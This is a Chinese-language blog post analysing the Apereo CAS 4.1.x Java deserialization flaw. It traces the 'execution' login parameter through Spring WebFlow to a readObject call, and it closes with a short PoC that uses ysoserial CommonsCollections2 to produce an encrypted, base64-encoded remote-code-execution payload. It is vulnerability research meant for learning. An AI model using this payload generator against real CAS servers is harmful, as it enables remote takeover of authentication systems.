---
layout: post
title: Apereo CAS 反序列化漏洞分析
date: 2020-01-17 16:16:16 +0800
categories: Web安全
tag: 漏洞分析
---

* content
{:toc}

{%raw%}  

## 0x00 前言  

CAS全称Central Authentication Service(中心认证服务)，它是一个单点登录(Single-Sign-On)协议，Apereo CAS是实现该协议的软件包。CAS最初由Yale大学的Shawn Bayern开发实现，随后由Yale大学的Drew Mazurek负责维护。2016年4月CAS官方披露了[v4.1.x和v4.2.x](https://apereo.github.io/2016/04/08/commonsvulndisc/)版本存在反序列化漏洞，2018年11月GitHub [frohoff/ysoserial](https://github.com/frohoff/ysoserial/pull/99/commits/cafb865e6dd79441866b76b415b5f371377f941e)项目中有大佬推送CAS Exploit未被接受，2019年12月该漏洞的POC在安全圈内流传。抱着学习的态度，下面我们一起分析下Apereo CAS反序列化漏洞的成因。  

## 0x01 漏洞分析  

### 1. 了解Java反序列化  

序列化是把对象转换成字节流，反序列化是逆过程，把字节流还原成对象。Java中ObjectOutputStream类的writeObject()方法可以实现对象的序列化，ObjectInputStream类的readObject()方法用于反序列化。如果被序列化的类重写了readObject()方法，在反序列化的时候，会调用重写的readObject()方法，如果重写的readObject()方法里面被插入了恶意代码，那在反序列化的过程中恶意代码就会被自动执行。具体看示例代码容易理解一点:  

定义需要被序列化的类Users  

```java
import java.io.IOException;
import java.io.Serializable;

//需要被序列化的类，必须实现Serializable接口
public class Users implements Serializable {

    private String name;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    //重写readObject方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
        //调用默认readObject方法，不破坏原逻辑
        in.defaultReadObject();
        System.out.println("重写的readObject方法...");
    }

}
```

把Users对象序列化，保存到本地users.bin文件中  

```java
    public void serialize() throws IOException {
        FileOutputStream out = new FileOutputStream("users.bin");
        ObjectOutputStream obj = new ObjectOutputStream(out);
        Users user = new Users();
        user.setName("Apereo CAS");
        obj.writeObject(user);
    }
```
反序列化还原user.bin文件中的Users对象  

```java
    public static void deserialize() throws IOException, ClassNotFoundException {
        FileInputStream in = new FileInputStream("users.bin");
        ObjectInputStream obj = new ObjectInputStream(in);
        //Users类中重写了readObject方法，会自动调用Users类中的readObject方法
        Users user = (Users) obj.readObject();
        System.out.println(user.getName());
    }
```

调用deserialize方法后输出如下，发现Users类中的readObject方法被自动调用  

![](/assets/images/2020-01-17-apereo_cas_deserialize/1.png)  

### 2. 环境准备  

以[cas-4.1.5](https://repo1.maven.org/maven2/org/jasig/cas/cas-server-webapp/4.1.5/cas-server-webapp-4.1.5.war)版本为例，下载war包，配置好tomcat运行环境，在tomcat bin目录下的catalina.bat文件中新增启动参数，使tomcat支持jdb动态调试  

```
set CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8899
```  

![](/assets/images/2020-01-17-apereo_cas_deserialize/2.png)    

启动tomcat，8899端口开启说明可以使用jdb调试  

![](/assets/images/2020-01-17-apereo_cas_deserialize/3.png)  

访问cas应用，抓取登录请求数据包如下  

![](/assets/images/2020-01-17-apereo_cas_deserialize/4.png)  

### 3. execution参数分析  

根据poc知道造成漏洞的原因的post参数execution造成的，所以需要找到处理execution参数的servlet，先看看web.xml配置文件，`/cas/login`接口由`org.springframework.web.servlet.DispatcherServlet`处理。  
（*注: spring中servlet的url-pattern匹配规则需要减去应用上下文路径，以剩余的字符串作为servlet映射。*）

![](/assets/images/2020-01-17-apereo_cas_deserialize/5.png)  

搜索下DispatcherServlet类所在文件  

![](/assets/images/2020-01-17-apereo_cas_deserialize/6.png)  

反编译spring-webmvc-4.1.8.RELEASE.jar，根据Spring DispatcherServlet请求分发流程可知，最终的核心处理方法是DispatcherServlet的doDispatch方法  

![](/assets/images/2020-01-17-apereo_cas_deserialize/7.png)  

需要关注的代码是939行的`HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());`，这里获取此次请求的HandlerAdapter，然后在959行 `mv = ha.handle(processedRequest, response, mappedHandler.getHandler());`调用实际实现的handle方法处理具体逻辑。  

使用JDB断点939行，看看处理当前登录请求的HandlerAdapter实现类  

![](/assets/images/2020-01-17-apereo_cas_deserialize/8.png)  

grep搜索SelectiveFlowHandlerAdapter类所在文件  

![](/assets/images/2020-01-17-apereo_cas_deserialize/9.png)  

反编译cas-server-webapp-support-4.1.5.jar，handle方法实现在SelectiveFlowHandlerAdapter的父类`./WEB-INF/lib/spring-webflow-2.4.1.RELEASE.jar!/org/springframework/webflow/mvc/servlet/FlowHandlerAdapter.class`文件中  

![](/assets/images/2020-01-17-apereo_cas_deserialize/10.png)  

静态分析handle方法，可知在224行调用了getFlowExecutionKey方法处理request，使用JDB动态调试看一看，其实现在org.jasig.cas.web.flow.CasDefaultFlowUrlHandler类中，该类在cas-server-webapp-support-4.1.5.jar文件里  

![](/assets/images/2020-01-17-apereo_cas_deserialize/11.png)  

getFlowExecutionKey方法实现如下，可知这里获取了post参数execution  

![](/assets/images/2020-01-17-apereo_cas_deserialize/12.png)  

回到handle方法，getFlowExecutionKey返回结果不等于null，进入225行的if判断，然后把获取的execution参数值传入resumeExecution方法，继续JDB调试，resumeExecution方法实现在FlowExecutorImpl类中  

![](/assets/images/2020-01-17-apereo_cas_deserialize/13.png)  

spring-webflow-2.4.1.RELEASE.jar!/org/springframework/webflow/executor/FlowExecutorImpl.class的resumeExecution方法实现如下 

![](/assets/images/2020-01-17-apereo_cas_deserialize/14.png)  

继续跟进164行的parseFlowExecutionKey方法，其实现在spring-webflow-client-repo-1.0.0.jar!/org/jasig/spring/webflow/plugin/ClientFlowExecutionRepository.class文件中  

![](/assets/images/2020-01-17-apereo_cas_deserialize/15.png)  

parse方法实现在ClientFlowExecutionKey类中，这里把execution参数值通过"`_`"符号split存放在String数组里面，然后base64解码再作为参数传入ClientFlowExecutionKey构造函数并RETURN    

![](/assets/images/2020-01-17-apereo_cas_deserialize/16.png)  

返回去接着看spring-webflow-2.4.1.RELEASE.jar!/org/springframework/webflow/executor/FlowExecutorImpl.class的resumeExecution方法，把return的ClientFlowExecutionKey对象传入getFlowExecution方法  

![](/assets/images/2020-01-17-apereo_cas_deserialize/17.png)  

getFlowExecution方法实现如下    

![](/assets/images/2020-01-17-apereo_cas_deserialize/18.png)  

88行先getData()获取execution参数"`_`"符号分割的后部分数据，data通过ClientFlowExecutionKey构造函数赋值  

![](/assets/images/2020-01-17-apereo_cas_deserialize/19.png)  

然后把获取到的数据传入this.transcoder.decode方法中，该方法实现在spring-webflow-client-repo-1.0.0.jar!/org/jasig/spring/webflow/plugin/EncryptedTranscoder.class文件  

![](/assets/images/2020-01-17-apereo_cas_deserialize/20.png)  

分析decode方法可知，首先把传入的data通过`cipherBean.decrypt`方法解密，最后解密的数据在117行`in.readObject()`处触发Java反序列化漏洞。这里数据加解密使用的是AES对称算法  

![](/assets/images/2020-01-17-apereo_cas_deserialize/21.png)  

### 4. 构造POC  

通过分析我们知道Apereo CAS应用RCE漏洞是Java反序列化造成的，所以可以借助GitHub开源工具[ysoserial](https://github.com/frohoff/ysoserial)生成POC，注意AES加密结果需要base64编码一下    

```java
import org.cryptacular.util.CodecUtil;
import ysoserial.payloads.ObjectPayload;

public class ApereoExploit {

    public static void main(String[] args) throws Exception{
        String poc[] = {"CommonsCollections2","calc"};
        final Object payloadObject = ObjectPayload.Utils.makePayloadObject(poc[0], poc[1]);
        //AES加密
        EncryptedTranscoder et = new EncryptedTranscoder();
        byte[] encode = et.encode(payloadObject);
        //base64编码
        System.out.println(CodecUtil.b64(encode));
    }
}
```  

效果如下  

![](/assets/images/2020-01-17-apereo_cas_deserialize/22.gif)  

## 0x02 结语  

漏洞利用本身并不复杂，有意义的在于分析过程中的所学所获，笔者水平有限，文章内容如有错误的地方，还请不吝赐教。

**References:**  

[深入理解Spring系列之十：DispatcherServlet请求分发源码分析](https://www.jianshu.com/p/1a17e210410c)  
[Apereo CAS 4.X execution参数反序列化漏洞分析](https://www.bus123.net/11807.html)  
[Java反序列化漏洞从无到有](https://www.freebuf.com/column/155381.html)  


**版权声明：转载请注明出处，谢谢。[https://github.com/curz0n](https://github.com/curz0n)**  

{%endraw%}  